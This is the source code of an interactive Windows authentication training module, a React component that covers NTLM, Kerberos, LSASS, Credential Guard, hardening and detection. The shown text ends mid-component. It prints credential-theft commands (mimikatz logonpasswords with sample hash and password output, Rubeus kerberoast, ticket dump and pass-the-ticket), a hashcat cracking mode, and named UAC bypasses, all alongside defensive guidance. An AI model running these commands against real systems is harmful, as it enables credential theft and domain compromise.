    { id:"01", label:"User presses Ctrl+Alt+Del (SAS)", sub:"Secure Attention Sequence — winlogon.exe intercepts", color:C.cyan, detail:"Only winlogon.exe can receive the SAS. This prevents malware from presenting a fake login screen to steal credentials. WLSvc (Winlogon) activates secure desktop." },
    { id:"02", label:"LogonUI.exe presents credential UI", sub:"Credential Provider framework loaded", color:C.teal, detail:"Credential providers (password, smart card, Windows Hello, FIDO2) present their UI. User enters credentials. Credential Provider packages them into KERB_INTERACTIVE_LOGON or MSV1_0_INTERACTIVE_LOGON structure." },
    { id:"03", label:"winlogon sends to LSASS via LPC", sub:"LsaLogonUser() → LSASS ALPC port", color:C.purple, detail:"Credentials passed through secure ALPC (Advanced Local Procedure Call) channel to lsass.exe. User-mode creds never touch disk — only go to LSASS in memory." },
    { id:"04", label:"LSASS selects auth package", sub:"Domain account → Kerberos first, NTLM fallback", color:C.orange, detail:"If domain joined and DC reachable: kerberos.dll handles auth. AS-REQ sent to KDC. If DC unreachable: MSV1_0 (NTLM) or cached credentials (DCC2) used." },
    { id:"05", label:"Kerberos AS-REQ → KDC", sub:"Pre-auth timestamp encrypted with NT hash", color:C.yellow, detail:"Client sends AS-REQ with PA-DATA containing encrypted timestamp (pre-authentication). KDC decrypts with stored user hash to verify identity. Returns AS-REP with TGT." },
    { id:"06", label:"TGT stored in LSASS", sub:"lsass credential cache updated", color:C.cyan, detail:"TGT (Ticket Granting Ticket) stored in Kerberos SSP within LSASS memory. Access token created with user SID, group SIDs, privileges. Logon session established." },
    { id:"07", label:"Access token assigned to session", sub:"CreateToken() → token attached to LogonSession", color:C.green, detail:"Access token built from Kerberos PAC data (SIDs, privileges). Token linked to logon session LUID. All processes launched in this session inherit token." },
    { id:"08", label:"Explorer.exe launched with token", sub:"userinit.exe → explorer.exe as user shell", color:C.lime, detail:"Winlogon calls userinit.exe which launches explorer.exe with the user's token. Desktop rendered. User session fully established." },
  ];
  return (
    <div>
      {steps.map((s, i) => (
        <div key={s.id} style={{ display: "flex", gap: "0" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "30px" }}>
            <div style={{ width: "22px", height: "22px", borderRadius: "50%", background: `${s.color}18`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "9px", color: s.color, fontWeight: "700", flexShrink: 0 }}>{s.id}</div>
            {i < steps.length - 1 && <div style={{ width: "1px", height: "28px", background: `${s.color}33` }} />}
          </div>
          <div style={{ paddingLeft: "10px", paddingBottom: "8px", flex: 1 }}>
            <div style={{ display: "flex", gap: "8px", alignItems: "center", flexWrap: "wrap" }}>
              <span style={{ color: s.color, fontWeight: "700", fontSize: "12px" }}>{s.label}</span>
              <span style={S.badge(s.color)}>{s.sub}</span>
            </div>
            <div style={{ color: C.dim, fontSize: "11px", marginTop: "2px", fontStyle: "italic" }}>{s.detail}</div>
          </div>
        </div>
      ))}
    </div>
  );
};

export default function WindowsStep07() {
  const [archTab, setArchTab] = useState("ntlm");
  const [intTab,  setIntTab]  = useState("lsass");
  const [atkTab,  setAtkTab]  = useState("ntlm");
  const [monTab,  setMonTab]  = useState("events");
  const [defTab,  setDefTab]  = useState("mitigations");
  const [cmpTab,  setCmpTab]  = useState("protocols");

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <div style={{ display: "flex", gap: "6px" }}>
          {[C.red, C.yellow, C.green].map((c, i) => <span key={i} style={S.dot(c)} />)}
        </div>
        <span style={{ color: C.blue, fontSize: "11px", fontWeight: "700", letterSpacing: "2px" }}>WIN-INTERNALS//CONSOLE</span>
        <span style={{ color: C.dim, fontSize: "10px", marginLeft: "auto" }}>MODULE 07 · AUTHENTICATION ENGINE · NT 10.0</span>
        <span style={S.dot(C.green)} />
      </div>

      <div style={S.wrap}>

        {/* ── 1: Title ── */}
        <div style={{ ...S.panel(C.blue), background: "linear-gradient(135deg, #090b14 55%, #001028)" }}>
          <div style={S.pb}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "12px" }}>
              <div>
                <div style={{ color: C.dim, fontSize: "10px", letterSpacing: "3px", marginBottom: "5px" }}>WINDOWS INTERNALS CURRICULUM · STEP 07</div>
                <div style={{ color: C.blue, fontSize: "22px", fontWeight: "800", lineHeight: "1.2" }}>Windows Authentication</div>
                <div style={{ color: C.bright, fontSize: "14px", fontWeight: "600", marginTop: "2px" }}>NTLM · Kerberos · LSASS · SAM · Credential Guard · PtH · Kerberoasting · DCSync</div>
                <div style={{ color: C.dim, fontSize: "11.5px", marginTop: "5px" }}>The identity engine of Windows enterprise — and the primary target of every credential-based attack</div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "5px", alignItems: "flex-end" }}>
                <Pill c={C.green}>LEVEL: INTERMEDIATE → EXPERT</Pill>
                <Pill c={C.blue}>DOMAIN: AUTHENTICATION / IDENTITY / ADVERSARIAL</Pill>
                <Pill c={C.purple}>MODULE 07 / 20+</Pill>
              </div>
            </div>
            <hr style={S.sep} />
            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
              {["Red Team","Blue Team","DFIR","Pen Tester","AD Admin","SOC L2/L3","Security Architect","Identity Engineer","Auditor"].map(r => (
                <Tag key={r} c={C.blue}>{r}</Tag>
              ))}
            </div>
          </div>
        </div>

        {/* ── 2: Concept ── */}
        <PB title="CONCEPT EXPLANATION" icon="🧠" color={C.cyan}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BEGINNER VIEW</div>
              <Row c={C.green}>When you log in to Windows, it needs to verify <strong style={{color:C.bright}}>who you are</strong> (authentication) and then decide <strong style={{color:C.bright}}>what you're allowed to do</strong> (authorization). Authentication creates a token — a signed pass that says "this is Alice, member of Admins group".</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>NTLM</strong> (NT LAN Manager) is the older protocol — a challenge-response system where your password hash proves your identity. Still used as fallback and in workgroup environments.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Kerberos</strong> is the modern domain authentication protocol. Think of it as an airport system: you first get a master pass (TGT) from security, then exchange it for boarding passes (service tickets) for individual flights (services).</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>LSASS</strong> (Local Security Authority Subsystem) is the process that manages all of this — it holds credential caches, validates tokens, and is the #1 target for credential theft.</Row>
            </div>
            <div>
              <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ TECHNICAL INTERNALS</div>
              <Row c={C.purple}><strong style={{color:C.bright}}>NTLM hash</strong> = MD4(UTF-16LE(password)). No salt. Password-equivalent — any attacker with the hash can authenticate as that user without knowing the plaintext. This is the core of Pass-the-Hash attacks.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>Kerberos</strong> uses symmetric cryptography. The KDC (Key Distribution Center, running on DC) knows all user/service secrets. TGTs are encrypted with <strong style={{color:C.bright}}>KRBTGT account key</strong> — compromise KRBTGT = Golden Ticket = eternal domain persistence.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>LSASS SSPs</strong> (Security Support Providers) are DLLs loaded into lsass.exe that implement specific auth protocols: msv1_0.dll (NTLM), kerberos.dll, wdigest.dll, tspkg.dll, etc. Each caches credentials in its own format.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>Credential Guard</strong> uses Hyper-V VSM (Virtual Secure Mode) to isolate lsaIso.exe in a separate trust level (VTL 1). NT hashes and Kerberos TGTs stored there are unreachable even from kernel-level exploits on the host OS.</Row>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid4}>
            {[
              ["NT hash = password equivalent", "MD4(password) with no salt. Anyone holding it can authenticate as that user. This is why LSASS dump = instant lateral movement.", C.red],
              ["KRBTGT = domain skeleton key", "KRBTGT NT hash signs all TGTs. Compromise it → forge tickets for any account, any group, any domain. Reset TWICE after compromise.", C.yellow],
              ["SPN = Kerberoast target", "Service Principal Names map services to accounts. Any domain user can request TGS for any SPN → offline crack service account password.", C.orange],
              ["Credential Guard = strongest defense", "VSM isolation means even SYSTEM + kernel exploit cannot extract NT hashes or TGTs. Requires hardware VT-x + IOMMU + UEFI.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 3: Architecture Diagrams ── */}
        <PB title="PROTOCOL ARCHITECTURE — NTLM · KERBEROS · LSASS · CREDENTIAL GUARD" icon="🔐" color={C.purple} accent={C.purple + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["ntlm","NTLM FLOW"],["kerberos","KERBEROS FLOW"],["lsass","LSASS ARCHITECTURE"],["credguard","CREDENTIAL GUARD"],["sam","SAM INTERNALS"]].map(([t, l]) => (
              <button key={t} style={S.tab(archTab === t, C.purple)} onClick={() => setArchTab(t)}>{l}</button>
            ))}
          </div>
          {archTab === "ntlm"     && <NTLMFlow />}
          {archTab === "kerberos" && <KerberosFlow />}
          {archTab === "lsass"    && <LSASSArch />}
          {archTab === "credguard"&& <CredGuardDiagram />}
          {archTab === "sam"      && <SAMInternals />}
        </PB>

        {/* ── 4: Login Workflow ── */}
        <PB title="WORKFLOW — WINDOWS INTERACTIVE LOGIN INTERNAL CHAIN" icon="⚙" color={C.orange}>
          <AuthWorkflow />
          <hr style={S.sep} />
          <div style={{ color: C.dim, fontSize: "11px" }}>
            <strong style={{ color: C.orange }}>Security design:</strong> The SAS (Ctrl+Alt+Del) is a hardware-level interrupt only winlogon.exe can receive — preventing keylogger or fake login UI attacks. Credential Providers run in a separate secure desktop context to isolate credential entry from user-space applications.
          </div>
        </PB>

        {/* ── 5: Commands ── */}
        <PB title="CMD / POWERSHELL — AUTHENTICATION OPERATIONS & ENUMERATION" icon="⌨" color={C.green}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ KERBEROS TICKET OPERATIONS</div>
              <div style={S.code}>
{`# List current Kerberos tickets:`}
{`C:\\> klist`}
{`C:\\> klist tickets  ; detailed`}
{``}
{`# Purge all tickets:`}
{`C:\\> klist purge`}
{``}
{`# Request service ticket for SPN:`}
{`PS> Add-Type -AssemblyName System.IdentityModel`}
{`PS> New-Object System.IdentityModel.Tokens.`}
{`    KerberosRequestorSecurityToken `}
{`    -ArgumentList "MSSQLSvc/sqlsrv.corp.local:1433"`}
{``}
{`# Export tickets (Rubeus):`}
{`C:\\> Rubeus.exe dump /service:krbtgt /nowrap`}
{`C:\\> Rubeus.exe kerberoast /outfile:hashes.txt`}
{``}
{`# Pass-the-Ticket:`}
{`C:\\> Rubeus.exe ptt /ticket:base64ticket`}
{`C:\\> klist  ; verify injected ticket`}
              </div>
            </div>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ NTLM & CREDENTIAL AUDIT</div>
              <div style={S.code}>
{`# Current logon session details:`}
{`C:\\> whoami /all`}
{`C:\\> whoami /logonid`}
{``}
{`# Audit NTLM protocol version in use:`}
{`PS> Get-ItemProperty `}
{`    HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa`}
{`    -Name LmCompatibilityLevel`}
{`# 5 = NTLMv2 only (recommended)`}
{``}
{`# Check Credential Guard status:`}
{`PS> Get-WmiObject -Namespace root\\Microsoft\\Windows\\DeviceGuard`}
{`    -Class Win32_DeviceGuard | `}
{`    Select SecurityServicesRunning`}
{`# 1 = Credential Guard running`}
{``}
{`# Check WDigest (plaintext creds in memory):`}
{`PS> (Get-ItemProperty `}
{`    HKLM:\\SYSTEM\\CurrentControlSet\\Control`}
{`    \\SecurityProviders\\WDigest).UseLogonCredential`}
{`# Must be 0 or not exist`}
{``}
{`# Check cached logon count:`}
{`PS> (Get-ItemProperty`}
{`    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT`}
{`    \\CurrentVersion\\Winlogon").CachedLogonsCount`}
              </div>
            </div>
          </div>
          <div style={{ marginTop: "12px" }}>
            <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AD AUTHENTICATION AUDIT (PRIVILEGED)</div>
            <div style={S.code}>
{`# Find accounts with no pre-auth (AS-REP Roasting candidates):`}
{`PS> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} `}
{`    -Properties DoesNotRequirePreAuth |`}
{`    Select SamAccountName, DoesNotRequirePreAuth`}
{``}
{`# Find Kerberoastable accounts (SPN set + not computer):`}
{`PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`}
{`    -Properties ServicePrincipalName,PasswordLastSet |`}
{`    Select SamAccountName,ServicePrincipalName,PasswordLastSet`}
{``}
{`# Find accounts with unconstrained delegation (dangerous!):`}
{`PS> Get-ADComputer -Filter {TrustedForDelegation -eq $true} `}
{`    -Properties TrustedForDelegation | Select Name`}
{`PS> Get-ADUser   -Filter {TrustedForDelegation -eq $true}`}
{`    -Properties TrustedForDelegation | Select Name`}
{``}
{`# Find accounts with constrained delegation:`}
{`PS> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}`}
{`    -Properties msDS-AllowedToDelegateTo | `}
{`    Select Name,msDS-AllowedToDelegateTo`}
{``}
{`# DCSync detection — who has replication rights:`}
{`PS> (Get-ACL "AD:\\DC=corp,DC=local").Access | `}
{`    Where { $_.ObjectType -match "1131f6a[ab]|89e95b76" } |`}
{`    Select IdentityReference, ObjectType`}
            </div>
          </div>
        </PB>

        {/* ── 6: Internal View ── */}
        <PB title="INTERNAL SYSTEM VIEW — LSASS · TICKETS · TOKEN LINEAGE" icon="🔬" color={C.teal}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["lsass","LSASS MEMORY LAYOUT"],["tickets","KERBEROS TICKET STRUCTURE"],["token","TOKEN LOGON SESSION LINK"]].map(([t, l]) => (
              <button key={t} style={S.tab(intTab === t, C.teal)} onClick={() => setIntTab(t)}>{l}</button>
            ))}
          </div>

          {intTab === "lsass" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LSASS MEMORY — WHAT ATTACKERS EXTRACT</div>
                <div style={S.code}>
{`# Extract from live LSASS dump (mimikatz):`}
{`mimikatz # privilege::debug`}
{`mimikatz # sekurlsa::logonpasswords`}
{``}
{`Output per logon session:`}
{`Authentication Id : 0 ; 123456 (00000000:0001e240)`}
{`Session           : Interactive from 1`}
{`User Name         : alice`}
{`Domain            : CORP`}
{`Logon Server      : DC01`}
{`Logon Time        : 2024-11-14 09:23:11`}
{`SID               : S-1-5-21-...-1001`}
{``}
{`  msv (NTLM credential):`}
{`    [00000003] Primary`}
{`    * Username : alice`}
{`    * NTLM     : aad3b435b51404eeaad3b435b51404ee`}
{`    * SHA1     : da39a3ee5e6b4b0d3255bfef95601890`}
{``}
{`  kerberos:`}
{`    * Username : alice`}
{`    * Password : (null)  ← Credential Guard active`}
{`    * TGT      : available if no Credential Guard`}
{``}
{`  wdigest (PLAINTEXT if enabled):`}
{`    * Username : alice`}
{`    * Password : P@ssw0rd  ← DISABLE WDIGEST!`}
                </div>
              </div>
              <div>
                <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LSASS PROTECTION LAYERS</div>
                {[
                  ["PPL (Protected Process Light)", "RunAsPPL=1: lsass.exe runs with PPL protection level. OpenProcess from non-PPL process returns ACCESS_DENIED even as SYSTEM. Blocks most dump tools.", C.green],
                  ["Credential Guard (VSM)", "NT hashes + TGTs stored in lsaIso.exe (VTL 1). Even kernel exploit cannot reach them. NT hash in lsass memory replaced with placeholder.", C.cyan],
                  ["ASR Rule — LSASS Protection", "ASR rule 9e6c4e1f-...: Block credential stealing from lsass. Intercepts OpenProcess calls targeting lsass before they succeed.", C.teal],
                  ["Windows Defender — LSASS Alert", "MDE generates alert on OpenProcess to lsass with PROCESS_VM_READ. EDR behavioral detection independent of Sysmon.", C.purple],
                  ["WDigest UseLogonCredential=0", "Prevents wdigest.dll from storing plaintext creds in LSA memory. Default since Windows 8.1. Verify registry value = 0.", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>✓ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {intTab === "tickets" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ KERBEROS TGT STRUCTURE</div>
                <div style={S.code}>
{`Ticket Granting Ticket (TGT) = KRB_TKT_BODY`}
{`  tkt-vno       : 5 (Kerberos version)`}
{`  realm         : CORP.LOCAL`}
{`  sname         : krbtgt/CORP.LOCAL`}
{`  enc-part      : encrypted with KRBTGT key`}
{`    ┌ Authorization-data (PAC):`}
{`    │  KERB_VALIDATION_INFO:`}
{`    │    LogonTime      FILETIME`}
{`    │    LogoffTime     FILETIME`}
{`    │    EffectiveName  alice`}
{`    │    UserId         1001 (RID)`}
{`    │    PrimaryGroupId 513 (Domain Users)`}
{`    │    GroupCount     N`}
{`    │    GroupIds[]     SID list`}
{`    │    UserFlags      NETLOGON_VALIDATION`}
{`    └    LogonServer     DC01`}
{``}
{`# Golden Ticket: forge this PAC with any SIDs`}
{`# KRBTGT hash signs the entire ticket`}
{`# Forged ticket valid even with real user deleted`}
                </div>
              </div>
              <div>
                <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SERVICE TICKET + KERBEROASTING TARGET</div>
                <div style={S.code}>
{`Service Ticket (TGS) = KRB_TKT_BODY`}
{`  realm    : CORP.LOCAL`}
{`  sname    : MSSQLSvc/sqlsrv:1433  ← SPN`}
{`  enc-part : encrypted with SERVICE account key`}
{`    ← this is what Kerberoasting extracts`}
{`    ← crack offline: hashcat -m 13100`}
{``}
{`Kerberoast hash format:`}
{`$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sqlsrv:1433`}
{`*<encrypted-part-base64>*<cipher-base64>`}
{``}
{`# Detect via Event 4769:`}
{`#  Service Name ≠ krbtgt`}
{`#  Ticket Encryption Type = 0x17 (RC4-HMAC)`}
{`#    (vs 0x12 = AES256 — harder to crack)`}
{``}
{`# Mitigation: use AES256 for service accounts`}
{`#   Set MSDS-SupportedEncryptionTypes = 0x18`}
{`#   Use long random passwords (>25 chars)`}
{`#   Group Managed Service Accounts (gMSA)`}
                </div>
              </div>
            </div>
          )}

          {intTab === "token" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.cyan, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LOGON SESSION → TOKEN → PROCESS CHAIN</div>
                <div style={S.code}>
{`Logon Session (LUID 0x3e7 = SYSTEM built-in)`}
{`  └─ Token A (SYSTEM primary token)`}
{`       ├─ UserSid: S-1-5-18`}
{`       ├─ Groups: Administrators, Everyone`}
{`       └─ Privileges: ALL enabled`}
{``}
{`Logon Session (LUID 0x1e240 = alice interactive)`}
{`  └─ Token B (alice primary token, Medium IL)`}
{`       ├─ UserSid: S-1-5-21-...-1001`}
{`       ├─ Groups: Domain Users, Workstation Users`}
{`       ├─ Privileges: SeShutdown [disabled]`}
{`       │              SeChangeNotify [enabled]`}
{`       └─ IntegrityLevel: Medium (0x2000)`}
{``}
{`Elevated Token (alice admin, if UAC elevated):`}
{`  └─ Token C (linked high-IL token)`}
{`       ├─ Same UserSid`}
{`       ├─ Groups: + Administrators (enabled)`}
{`       └─ IntegrityLevel: High (0x3000)`}
{``}
{`Process inheritance:`}
{`  explorer.exe → Token B`}
{`    chrome.exe → Token B (inherited)`}
{`    cmd.exe (runas) → Token C (elevated)`}
                </div>
              </div>
              <div>
                <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ UAC TOKEN ELEVATION FLOW</div>
                {[
                  ["Filtered token created at logon", "When a member of Administrators logs in interactively, Windows creates TWO tokens: filtered (medium IL, limited groups) + full admin token (high IL). UAC decides which to use.", C.orange],
                  ["Auto-elevation (manifest-based)", "Executables with requestedExecutionLevel=requireAdministrator and Microsoft signature skip UAC prompt. e.g. mmc.exe, eventvwr.exe. UAC bypass targets these.", C.yellow],
                  ["Consent.exe prompt", "For non-auto-elevated requests: consent.exe runs on secure desktop, shows UAC dialog. User approves → elevated token created for target process.", C.cyan],
                  ["UAC bypass techniques", "eventvwr.exe hijack (registry), fodhelper.exe COM bypass, DiskCleanup, CMSTPLUA. All exploit auto-elevation in trusted MS binaries to gain high IL without prompt.", C.red],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#0a090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 7: Attack Matrix ── */}
        <PB title="CREDENTIAL ATTACK MATRIX — NTLM · KERBEROS · CREDENTIAL THEFT" icon="⚔" color={C.red} accent={C.red + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["ntlm","NTLM ATTACKS"],["kerberos","KERBEROS ATTACKS"],["credential","CREDENTIAL THEFT"]].map(([t, l]) => (
              <button key={t} style={S.tab(atkTab === t, C.red)} onClick={() => setAtkTab(t)}>{l}</button>
            ))}
          </div>
          <AttackMatrix tab={atkTab} />
        </PB>

        {/* ── 8: Defense ── */}
        <PB title="DEFENSE — HARDENING AUTHENTICATION" icon="🛡" color={C.green} accent={C.green + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["mitigations","config","gpo"].map(t => (
              <button key={t} style={S.tab(defTab === t, C.green)} onClick={() => setDefTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {defTab === "mitigations" && (
            <div style={S.grid2}>
              {[
                ["Disable NTLMv1 / enforce NTLMv2", "LmCompatibilityLevel=5 (Send NTLMv2 only, refuse LM/NTLMv1). Kills NTLMv1 rainbow table attacks. GPO: Security Settings → Local Policies → Security Options.", C.green],
                ["Enable Credential Guard", "VBS + lsaIso.exe = NT hashes + TGTs unreachable even from kernel. Requires Hyper-V + UEFI + IOMMU + WDDM driver support.", C.cyan],
                ["Enable PPL for LSASS", "RunAsPPL=1: LSASS dump blocked from non-PPL processes even as SYSTEM. Verify with Process Explorer (pink shield icon on lsass).", C.green],
                ["Disable WDigest", "UseLogonCredential=0 in HKLM\\...\\WDigest. Prevents plaintext credential storage in LSA memory. Default off since Win 8.1.", C.teal],
                ["Enforce SMB Signing", "Prevents NTLM relay attacks. GPO: Microsoft Network Server: Digitally sign communications (always) = Enabled.", C.orange],
                ["Block NTLM entirely (domain)", "GPO: Restrict NTLM → Outgoing NTLM traffic = Deny all. Audit NTLM first (30+ days) to avoid breaking legacy apps.", C.yellow],
                ["Group Managed Service Accounts", "gMSA: 240-char auto-rotating password. No Kerberoasting (random key), no password exposure. Replace service accounts.", C.purple],
                ["Require AES for Kerberos", "Set msDS-SupportedEncryptionTypes = 0x18 (AES128+AES256). Disable RC4 (0x17). Kerberoast tickets become AES256 — computationally infeasible to crack.", C.green],
              ].map(([t, d, c]) => (
                <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
                  <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>✓ {t}</div>
                  <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {defTab === "config" && (
            <div style={S.code}>
{`# ── NTLM hardening ──`}
{`# NTLMv2 only (Level 5):`}
{`Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa`}
{`    -Name LmCompatibilityLevel -Value 5`}
{``}
{`# Disable NTLMv1 response on client:`}
{`Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa`}
{`    -Name NoLMHash -Value 1`}
{``}
{`# ── Credential protection ──`}
{`# Enable PPL for lsass:`}
{`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa`}
{`    /v RunAsPPL /t REG_DWORD /d 1 /f`}
{``}
{`# Disable WDigest:`}
{`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control`}
{`    \\SecurityProviders\\WDigest`}
{`    /v UseLogonCredential /t REG_DWORD /d 0 /f`}
{``}
{`# Enable Credential Guard:`}
{`reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA`}
{`    /v LsaCfgFlags /t REG_DWORD /d 1 /f`}
{``}
{`# ── Kerberos hardening ──`}
{`# Reduce cached logon count (sensitive servers → 0):`}
{`Set-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT`}
{`    \\CurrentVersion\\Winlogon" `}
{`    -Name CachedLogonsCount -Value 0`}
{``}
{`# Require AES for service accounts (PowerShell AD):`}
{`Set-ADUser svc_sql -Replace `}
{`    @{'msDS-SupportedEncryptionTypes'=24}  # AES128+AES256`}
{``}
{`# Remove pre-auth bypass (fix AS-REP Roasting):`}
{`Set-ADAccountControl jsmith `}
{`    -DoesNotRequirePreAuth $false`}
{``}
{`# ── DCSync rights audit ──`}
{`# Remove DCSync rights from non-DC accounts:`}
{`# Use AD ACL editor to remove DS-Replication-Get-Changes-All`}
{`# from any account that isn't a DC computer object`}
            </div>
          )}

          {defTab === "gpo" && (
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ CRITICAL GROUP POLICY SETTINGS FOR AUTHENTICATION HARDENING</div>
              {[
                ["Computer Config → Windows Settings → Security Settings → Local Policies → Security Options", [
                  "Network security: LAN Manager authentication level = Send NTLMv2 response only. Refuse LM & NTLM",
                  "Network security: Minimum session security for NTLM SSP: Require NTLMv2 session security + 128-bit encryption",
                  "Network security: Restrict NTLM: Audit NTLM authentication in this domain → Enable all",
                  "Interactive logon: Number of previous logons to cache = 0 (or 1 max for servers, 2 for workstations)",
                  "Interactive logon: Require smart card = Enabled (for admin accounts)",
                  "Microsoft network client/server: Digitally sign communications (always) = Enabled (SMB signing)",
                ]],
                ["Computer Config → Admin Templates → System → Credential Delegation", [
                  "Encryption Oracle Remediation = Force Updated Clients (blocks CredSSP downgrade — CVE-2018-0886)",
                  "Restrict delegation of credentials to remote servers = Enabled (blocks unconstrained delegation abuse)",
                ]],
                ["Computer Config → Admin Templates → Windows Defender → Device Guard", [
                  "Turn on Virtualization Based Security = Enabled",
                  "Credential Guard Configuration = Enabled with UEFI lock",
                  "Secure Launch Configuration = Enabled",
                ]],
              ].map(([path, settings]) => (
                <div key={path} style={{ background: "#08090d", border: `1px solid ${C.green}22`, borderRadius: "4px", padding: "12px", marginBottom: "10px" }}>
                  <div style={{ color: C.teal, fontSize: "11px", fontWeight: "700", marginBottom: "8px" }}>📁 {path}</div>
                  {settings.map(s => (
                    <div key={s} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                      <span style={{ color: C.green, fontSize: "11px" }}>☑</span>
                      <span style={{ color: C.dim, fontSize: "11px" }}>{s}</span>
                    </div>
                  ))}
                </div>
              ))}
            </div>
          )}
        </PB>

        {/* ── 9: Monitoring ── */}
        <PB title="MONITORING & DETECTION — AUTH EVENTS · SIEM RULES · TOOLS" icon="👁" color={C.yellow}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["events","siem","tools","iocs"].map(t => (
              <button key={t} style={S.tab(monTab === t, C.yellow)} onClick={() => setMonTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {monTab === "events" && (
            <div>
              <div style={S.grid2}>
                {[
                  ["4624", "Successful logon — LogonType 3 (net), 10 (RDP). AuthPkg: NTLM vs Kerberos.", C.green],
                  ["4625", "Failed logon — Status/Sub codes indicate reason (wrong password, account locked, etc.)", C.red],
                  ["4648", "Explicit credential logon — RunAs, CreateProcessWithLogonW, WMI with alternate creds", C.orange],
                  ["4768", "Kerberos AS-REQ — TGT requested. PreAuth-Type 0 = AS-REP Roastable account.", C.yellow],
                  ["4769", "Kerberos TGS-REQ — Service ticket requested. Encryption 0x17 = RC4 = Kerberoast indicator.", C.red],
                  ["4771", "Kerberos pre-auth failed — wrong password on domain account (on DC log)", C.orange],
                  ["4776", "NTLM credential validation — appears on DC for domain NTLM auth. Source workstation logged.", C.cyan],
                  ["4662", "AD object operation — DCSync detection: filter for DS-Replication-Get-Changes-All GUID from non-DC", C.red],
                  ["4720", "User account created — new AD/local account. Alert if created outside change window.", C.orange],
                  ["4726", "User account deleted — AD cleanup or attacker covering tracks.", C.dim],
                  ["4732", "Member added to security-enabled local group — Administrators group change = critical alert.", C.red],
                  ["4798", "User's local group membership enumerated — BloodHound/ADRecon reconnaissance activity.", C.orange],
                ].map(([id, desc, c]) => (
                  <div key={id} style={{ display: "flex", gap: "10px", marginBottom: "7px", alignItems: "flex-start" }}>
